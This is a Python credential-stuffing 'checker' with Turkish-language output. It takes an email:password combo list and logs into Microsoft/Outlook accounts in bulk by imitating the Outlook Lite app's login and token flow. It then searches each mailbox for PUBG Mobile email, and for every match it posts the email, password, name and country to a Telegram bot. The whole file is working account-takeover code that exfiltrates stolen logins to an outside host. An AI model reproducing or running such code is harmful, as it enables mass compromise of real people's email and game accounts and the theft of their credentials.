import os, uuid, concurrent.futures
try:
    import requests
    from rich.console import Console
    from rich.panel import Panel
except ImportError:
    os.system('pip install requests rich')
    os.system('clear')
    import requests
    from rich.console import Console
    from rich.panel import Panel
import webbrowser

total_accounts = 0
valid_accounts = 0
supercell_accounts = 0
supercell_email_counts = {}

if __name__=='__main__':
    webbrowser.open('https://t.me/PythonWebCheckers')
    console = Console()
    os.system('clear')

Tok = input('TOKEN TELE : ')
id = input('ID TELE: ')

class SupercellChecker:
    @staticmethod
    def count_supercell_emails(Email, Password, token, CID):
        global valid_accounts, supercell_accounts, supercell_email_counts
        he = {
            "User-Agent": "Outlook-Android/2.0",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{CID}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        try:
            r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=he).json()
            info_name = (r.get('names', []))
            info_Loca = (r.get('accounts', []))
            name = info_name[0]['displayName'] if info_name else "Unknown"
            Loca = info_Loca[0]['location'] if info_Loca else "Unknown"
            url = f"https://outlook.live.com/owa/{Email}/startupdata.ashx?app=Mini&n=0"
            headers = {
                "Host": "outlook.live.com",
                "content-length": "0",
                "x-owa-sessionid": f"{CID}",
                "x-req-source": "Mini",
                "authorization": f"Bearer {token}",
                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
                "action": "StartupData",
                "x-owa-correlationid": f"{CID}",
                "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
                "content-type": "application/json; charset=utf-8",
                "accept": "*/*",
                "origin": "https://outlook.live.com",
                "x-requested-with": "com.microsoft.outlooklite",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://outlook.live.com/",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9"
            }
            rese = requests.post(url, headers=headers, data="").text
            supercell_identifier = "noreply@pubgmobile.com"
            if supercell_identifier in rese:
                email_count = rese.count(supercell_identifier)
                supercell_email_counts[Email] = email_count
                supercell_accounts += 1
                ff = f'''
<>>>>>>[ @layznxw7 ]<<<<<<>
♱🇹🇷EMAİL : {Email}
♱🇹🇷ŞİFRE : {Password}
♱🇹🇷İSİM: {name}
♱🇹🇷ÜLKE : {Loca}
♱🇹🇷PUBG MAİL SAYISI: {email_count}
<>>>>>>[ @layznxw7 ]<<<<<<>
'''
                requests.post(f"https://api.telegram.org/bot{Tok}/sendMessage?chat_id={id}&text={ff}")
                print(f'\033[2;32m✅ PUBG HESABI BULUNDU: {Email} | {Password} | {email_count} mail')
            else:
                print(f'\033[1;33mGeçerli hesap PUBG değil: {Email} | {Password}')
            valid_accounts += 1
        except:
            print(f'\033[2;31mHata: {Email} kontrol edilirken bir sorun oluştu')

    @staticmethod
    def get_token(Email, Password, cook, hh):
        try:
            Code = hh.get('Location').split('code=')[1].split('&')[0]
            CID = cook.get('MSPCID').upper()
            url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
            data = {
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": Code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            response = requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
            token = response.json()["access_token"]
            SupercellChecker.count_supercell_emails(Email, Password, token, CID)
        except:
            print(f'\033[2;31mToken alınamadı: {Email}')

    @staticmethod
    def login_protocol(Email, Password, URL, PPFT, AD, MSPRequ, uaid, RefreshTokenSso, MSPOK, OParams):
        global total_accounts
        total_accounts += 1
        try:
            lenn = f"i13=1&login={Email}&loginfmt={Email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={Password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            Ln = len(lenn)
            headers = {
                "Host": "login.live.com",
                "Connection": "keep-alive",
                "Content-Length": str(Ln),
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": "1",
                "Origin": "https://login.live.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "X-Requested-With": "com.microsoft.outlooklite",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Referer": f"{AD}haschrome=1",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Cookie": f"MSPRequ={MSPRequ};uaid={uaid}; RefreshTokenSso={RefreshTokenSso}; MSPOK={MSPOK}; OParams={OParams}; MicrosoftApplicationsTelemetryDeviceId={uuid}"
            }
            res = requests.post(URL, data=lenn, headers=headers, allow_redirects=False)
            cook = res.cookies.get_dict()
            hh = res.headers
            if any(key in cook for key in ["JSH", "JSHP", "ANON", "WLSSC"]) or res.text == '':
                SupercellChecker.get_token(Email, Password, cook, hh)
            else:
                print(f'\033[2;31mGeçersiz Hesap: {Email} | {Password}')
        except:
            print(f'\033[2;31mGiriş hatası: {Email}')

    @staticmethod
    def get_values(Email, Password):
        headers = {
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "return-client-request-id": "false",
            "client-request-id": "205740b4-7709-4500-a45b-b8e12f66c738",
            "x-ms-sso-ignore-sso": "1",
            "correlation-id": str(uuid.uuid4()),
            "x-client-ver": "1.1.0+9e54a0d1",
            "x-client-os": "28",
            "x-client-sku": "MSAL.xplat.android",
            "x-client-src-sku": "MSAL.xplat.android",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        }
        try:
            response = requests.get("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint="+str(Email)+"&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D", headers=headers)
            cok = response.cookies.get_dict()
            URL = response.text.split("urlPost:'")[1].split("'")[0]
            PPFT = response.text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
            AD = response.url.split('haschrome=1')[0]
            MSPRequ = cok['MSPRequ']
            uaid = cok['uaid']
            RefreshTokenSso = cok['RefreshTokenSso']
            MSPOK = cok['MSPOK'],
            OParams = cok['OParams']
            SupercellChecker.login_protocol(Email, Password, URL, PPFT, AD, MSPRequ, uaid, RefreshTokenSso, MSPOK, OParams)
        except:
            SupercellChecker.get_values(Email, Password)

    @staticmethod
    def run():
        console = Console()
        os.system('clear')
        P = Panel('[bold yellow] @layznxw7 | @PythonWebCheckers\n\n[bold bright_red]PUBG CHECKER[/bold bright_red]\n', border_style="bright_green")
        console.print(P)
        file = input('Combo Yolu Gir: ')
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=50)
        with open(file, "r") as f:
            for line in f:
                try:
                    if ':' in line:
                        email = line.strip().split(':')[0]
                        password = line.strip().split(':')[1]
                        executor.submit(SupercellChecker.get_values, email, password)
                except:
                    pass
        executor.shutdown(wait=True)
        print("\n\n")
        console.print(Panel(f"[bold green]İŞLEM TAMAMLANDI[/bold green]\n\n[yellow]Toplam kontrol edilen: {total_accounts}[/yellow]\n[green]Geçerli hesaplar: {valid_accounts}[/green]\n[bright_red]PUBG BAĞLANTILI HESAPLAR: {supercell_accounts}[/bright_red]", border_style="bright_green"))
        if supercell_accounts > 0:
            print("\n[En Çok PUBG Maili Olan Hesaplar]")
            sorted_accounts = sorted(supercell_email_counts.items(), key=lambda x: x[1], reverse=True)
            for email, count in sorted_accounts[:5]:
                print(f"{email}: {count} mail")

if __name__=='__main__':
    SupercellChecker.run()